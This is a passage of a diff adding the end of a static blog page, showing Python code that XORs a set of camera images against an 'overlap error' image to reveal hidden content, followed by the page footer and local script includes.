+<span class="n">imajs</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="p">(</span><span class="n">dirpath</span><span class="p">,</span> <span class="n">dirnames</span><span class="p">,</span> <span class="n">filenames</span><span class="p">)</span> <span class="ow">in</span> <span class="n">walk</span><span class="p">(</span><span class="n">mydir</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">filename</span> <span class="ow">in</span> <span class="n">filenames</span><span class="p">:</span>
+        <span class="k">if</span> <span class="s">&quot;factory_cam_&quot;</span> <span class="ow">in</span> <span class="n">filename</span><span class="p">:</span>
+
+            <span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">mydir</span><span class="p">,</span> <span class="n">filename</span><span class="p">))</span><span class="o">.</span><span class="n">convert</span><span class="p">(</span><span class="s">&quot;RGBA&quot;</span><span class="p">)</span>
+            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">img</span><span class="o">.</span><span class="n">getbands</span><span class="p">())</span> <span class="o">==</span> <span class="mi">4</span> <span class="ow">and</span> <span class="bp">False</span><span class="p">:</span>
+                <span class="n">ir</span><span class="p">,</span> <span class="n">ig</span><span class="p">,</span> <span class="n">ib</span><span class="p">,</span> <span class="n">ia</span> <span class="o">=</span> <span class="n">img</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+                <span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">merge</span><span class="p">(</span><span class="s">&#39;RGB&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">ir</span><span class="p">,</span> <span class="n">ig</span><span class="p">,</span> <span class="n">ib</span><span class="p">))</span>
+
+            <span class="n">imajs</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">img</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">imajs</span><span class="p">)</span>
+
+<span class="n">myimaj</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">mydir</span><span class="p">,</span> <span class="s">&quot;camera_feed_overlap_error.png&quot;</span><span class="p">))</span>
+<span class="n">myr</span><span class="p">,</span> <span class="n">myg</span><span class="p">,</span> <span class="n">myb</span><span class="p">,</span> <span class="n">mya</span> <span class="o">=</span> <span class="n">myimaj</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+
+<span class="n">x</span><span class="o">=</span><span class="mi">0</span>
+<span class="k">for</span> <span class="n">imaj1</span> <span class="ow">in</span> <span class="n">imajs</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">imaj1</span><span class="p">,</span><span class="n">myimaj</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">imaj1</span> <span class="o">==</span> <span class="n">myimaj</span><span class="p">:</span>
+        <span class="k">continue</span>
+    <span class="k">if</span> <span class="n">imaj1</span><span class="o">.</span><span class="n">size</span> <span class="o">!=</span> <span class="n">myimaj</span><span class="o">.</span><span class="n">size</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">&quot;size mismatch&quot;</span><span class="p">)</span>
+        <span class="k">continue</span>
+
+    <span class="n">myimaj</span> <span class="o">=</span> <span class="n">ImageMath</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="s">&quot;convert(a^b, &#39;L&#39;)&quot;</span><span class="p">,</span> <span class="n">a</span><span class="o">=</span><span class="n">imaj1</span><span class="o">.</span><span class="n">convert</span><span class="p">(</span><span class="s">&#39;L&#39;</span><span class="p">),</span> <span class="n">b</span><span class="o">=</span><span class="n">myimaj</span><span class="o">.</span><span class="n">convert</span><span class="p">(</span><span class="s">&#39;L&#39;</span><span class="p">))</span>
+    <span class="n">myimaj</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%d</span><span class="s">_eval_xor.png&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">x</span><span class="p">))</span>
+    <span class="n">x</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">continue</span>
+</code></pre></div>
+</p>
+
+    </div>
+  </div>
+
+  <ul class="pager">
+    
+
+    
+    
+      
+    
+  </ul>
+
+
+
+<footer>
+
+  <p class="text-muted credit">&copy; . All rights reserved. </p>
+    </footer>
+
+  
+  
+
+  <script type="text/javascript" src="/js/jquery-2.1.4.js"></script>
+
+  <script src="/js/bootstrap.min.js"></script>
+  <script src="/js/bootstrap.js"></script>
+  <script type="text/javascript" src="/js/hc.js"></script>
+
+  
+  <script type="text/javascript" src="/lightbox/js/lightbox.js"></script>
+
+  
+
+</footer>
+
+
+	</body>
+</html>
